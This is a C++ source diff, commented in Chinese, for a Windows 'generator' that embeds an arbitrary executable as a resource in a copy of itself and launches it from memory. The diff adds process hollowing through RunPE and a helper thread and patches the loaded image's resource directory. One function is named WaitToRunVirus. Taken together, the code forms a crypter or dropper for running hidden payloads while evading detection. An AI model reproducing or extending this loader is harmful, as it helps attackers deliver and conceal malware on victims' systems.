@@ -2,6 +2,7 @@
 #include "resource.h"
 
 #include "MemoryModule.h"
+#include "ProcessHollowing.h"
 
 #include <windows.h>
 #include <iostream>
@@ -9,6 +10,29 @@
 #include <thread>
 
 #include <atlstr.h>
+
+BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
+BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
+BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
+BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);
+
+// 枚举资源类型的回调函数
+BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
+BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
+BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
+BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);
+
+// 用于 Process Hollowing 的辅助线程函数
+DWORD WINAPI HollowingThread(LPVOID lpParam);
+
+// 将资源添加到新文件的结构体
+struct ResourceUpdateData {
+    HANDLE hUpdate;
+};
+
+struct ResourceUpdateData32 {
+    HANDLE hUpdate;
+};
 
 class CPEGenerator
 {
@@ -29,7 +53,26 @@ public:
             CString str_param = argv[1];
             if (str_param == L"run") {
                 // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
-                MemoryLoadToRun(IDR_BINARY_FILE);
+                // MemoryLoadToRun(IDR_BINARY_FILE);
+                RunPE();
+
+                HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
+                if (!hMainThread) {
+                    return;
+                }
+
+                // 创建辅助线程执行 Hollowing
+                HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
+                if (!hThread) {
+                    CloseHandle(hMainThread);
+                    return;
+                }
+
+                // 等待辅助线程完成
+                WaitForSingleObject(hThread, INFINITE);
+                CloseHandle(hThread);
+                CloseHandle(hMainThread);
+
             }
             else if (str_param == L"wait") {
                 return;
@@ -41,87 +84,113 @@ public:
             DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
             LPCWSTR resourceFilePath = argv[1];
             LPCWSTR newExePath = argv[2];
-
+#ifdef _WIN64
             AddFileToResource(exePath, resourceFilePath, newExePath);
+#else
+            AddFileToResource32(exePath, resourceFilePath, newExePath);
+#endif
         }
+    }   
+
+    //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
+    //    WCHAR tempFilePath[MAX_PATH];
+
+    //    // 创建临时文件路径
+    //    GetTempPath(MAX_PATH, tempFilePath);
+    //    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);
+
+    //    // 将当前可执行文件复制到临时文件
+    //    if (!CopyFile(exePath, tempFilePath, FALSE)) {
+    //        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
+    //        return FALSE;
+    //    }
+
+    //    // 打开临时文件进行资源更新
+    //    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
+    //    if (!hUpdate) {
+    //        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
+    //        DeleteFile(tempFilePath); // 删除临时文件
+    //        return FALSE;
+    //    }
+
+    //    // 打开要添加到资源的文件
+    //    std::ifstream file(resourceFilePath, std::ios::binary);
+    //    if (!file.is_open()) {
+    //        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
+    //        EndUpdateResource(hUpdate, TRUE);
+    //        DeleteFile(tempFilePath); // 删除临时文件
+    //        return FALSE;
+    //    }
+
+    //    // 读取文件内容到内存
+    //    file.seekg(0, std::ios::end);
+    //    size_t fileSize = file.tellg();
+    //    file.seekg(0, std::ios::beg);
+
+    //    char* buffer = new char[fileSize];
+    //    file.read(buffer, fileSize);
+    //    file.close();
+
+    //    // 将文件内容更新到资源中
+    //    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
+    //        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
+    //        delete[] buffer;
+    //        EndUpdateResource(hUpdate, TRUE);
+    //        DeleteFile(tempFilePath); // 删除临时文件
+    //        return FALSE;
+    //    }
+
+    //    delete[] buffer;
+
+    //    // 完成资源更新
+    //    if (!EndUpdateResource(hUpdate, FALSE)) {
+    //        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
+    //        DeleteFile(tempFilePath); // 删除临时文件
+    //        return FALSE;
+    //    }
+
+    //    // 将修改后的临时文件复制到目标文件路径
+    //    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
+    //        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
+    //        DeleteFile(tempFilePath); // 删除临时文件
+    //        return FALSE;
+    //    }
+
+    //    // 删除临时文件
+    //    DeleteFile(tempFilePath);
+
+    //    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
+    //    return TRUE;
+    //}
+
+
+    // 获取当前进程的资源段基地址
+    IMAGE_RESOURCE_DIRECTORY* GetCurrentProcessResourceDirectory() {
+        HMODULE hModule = GetModuleHandle(NULL);
+        if (!hModule) return nullptr;
+
+        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+
+        DWORD resourceRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
+        if (resourceRVA == 0) return nullptr;
+
+        return (IMAGE_RESOURCE_DIRECTORY*)((BYTE*)hModule + resourceRVA);
     }
 
-    BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
-        WCHAR tempFilePath[MAX_PATH];
+    void RedirectResourceDirectory(HMEMORYMODULE loadedModule, IMAGE_RESOURCE_DIRECTORY* newResourceDir) {
+        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)loadedModule;
+        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)loadedModule + dosHeader->e_lfanew);
 
-        // 创建临时文件路径
-        GetTempPath(MAX_PATH, tempFilePath);
-        GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);
-
-        // 将当前可执行文件复制到临时文件
-        if (!CopyFile(exePath, tempFilePath, FALSE)) {
-            MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
-            return FALSE;
-        }
-
-        // 打开临时文件进行资源更新
-        HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
-        if (!hUpdate) {
-            MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
-            DeleteFile(tempFilePath); // 删除临时文件
-            return FALSE;
-        }
-
-        // 打开要添加到资源的文件
-        std::ifstream file(resourceFilePath, std::ios::binary);
-        if (!file.is_open()) {
-            MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
-            EndUpdateResource(hUpdate, TRUE);
-            DeleteFile(tempFilePath); // 删除临时文件
-            return FALSE;
-        }
-
-        // 读取文件内容到内存
-        file.seekg(0, std::ios::end);
-        size_t fileSize = file.tellg();
-        file.seekg(0, std::ios::beg);
-
-        char* buffer = new char[fileSize];
-        file.read(buffer, fileSize);
-        file.close();
-
-        // 将文件内容更新到资源中
-        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
-            MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
-            delete[] buffer;
-            EndUpdateResource(hUpdate, TRUE);
-            DeleteFile(tempFilePath); // 删除临时文件
-            return FALSE;
-        }
-
-        delete[] buffer;
-
-        // 完成资源更新
-        if (!EndUpdateResource(hUpdate, FALSE)) {
-            MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
-            DeleteFile(tempFilePath); // 删除临时文件
-            return FALSE;
-        }
-
-        // 将修改后的临时文件复制到目标文件路径
-        if (!CopyFile(tempFilePath, newExePath, FALSE)) {
-            MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
-            DeleteFile(tempFilePath); // 删除临时文件
-            return FALSE;
-        }
-
-        // 删除临时文件
-        DeleteFile(tempFilePath);
-
-        MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
-        return TRUE;
+        // 修改资源目录的 RVA 和大小指向当前进程的资源段
+        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = (DWORD)((BYTE*)newResourceDir - (BYTE*)loadedModule);
     }
 
-    BOOL RunGenerator(CString cmdline) {
+    HANDLE RunGenerator(CString cmdline) {
         BOOL flag = FALSE;
 
         STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
+        PROCESS_INFORMATION pi = { 0 };
 
         // 使用 CreateProcess 运行自身
         flag = CreateProcess(
@@ -148,7 +217,7 @@ public:
             std::cerr << "启动失败，错误码：" << GetLastError() << std::endl;
         }
 
-        return flag;
+        return pi.hProcess;
     }
 
     BOOL WaitToRunVirus() {
@@ -177,6 +246,9 @@ public:
     }
 
     BOOL MemoryLoadToRun(int resourceId) {
+
+        MessageBox(NULL, L"test", L"test", MB_OK);
+
         BOOL flag = FALSE;
         try {
             // 加载当前模块
@@ -210,6 +282,19 @@ public:
                 std::cout << "Failed to load EXE into memory." << std::endl;
                 return flag;
             }
+            
+
+            // 获取当前进程的资源目录地址
+            IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
+            if (currentResourceDir) {
+                // 重定向内存加载 EXE 的资源目录指针
+                RedirectResourceDirectory(hmemModule, currentResourceDir);
+            }
+            else {
+                std::cerr << "Failed to locate current process resource directory." << std::endl;
+            }
+            
+            
 
             // 3. 获取 EXE 文件的入口点并调用
             MemoryCallEntryPoint(hmemModule);
@@ -221,7 +306,7 @@ public:
             std::cout << "Error: " << e.what() << std::endl;
             return flag;
         }
-
+        return flag;
     }
 
     bool FileExists(CString filePath) {
